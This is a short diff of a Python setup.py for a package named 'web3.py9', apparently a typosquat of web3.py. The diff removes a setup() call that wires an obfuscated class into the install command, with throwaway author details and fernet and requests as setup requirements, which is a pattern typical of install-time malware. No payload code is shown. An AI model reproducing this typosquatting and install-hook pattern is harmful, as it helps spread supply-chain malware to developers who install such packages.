@@ -18,22 +18,5 @@ class eiOzsjgaAqeJoAaUzqZPSSuPhrGEtcmlseCnNqHlBKoBVPCxOiMSbjPFuzrqkhzuvIosfSrVPX
             install.run(self)
 
 
-setup(
-    name="web3.py9",
-    version=VERSION,
-    author="xiqRycAiSOBMRhJkkNF",
-    author_email="oesyIAXgOTztAT@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': eiOzsjgaAqeJoAaUzqZPSSuPhrGEtcmlseCnNqHlBKoBVPCxOiMSbjPFuzrqkhzuvIosfSrVPXzkPWtLzBirWMgBxQmgXhSHkdfYyYJyiboMbQVyVTHmeNYFreJjDJkgPpxkWZnqrxjwBDgXhRsDUyTr,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
 
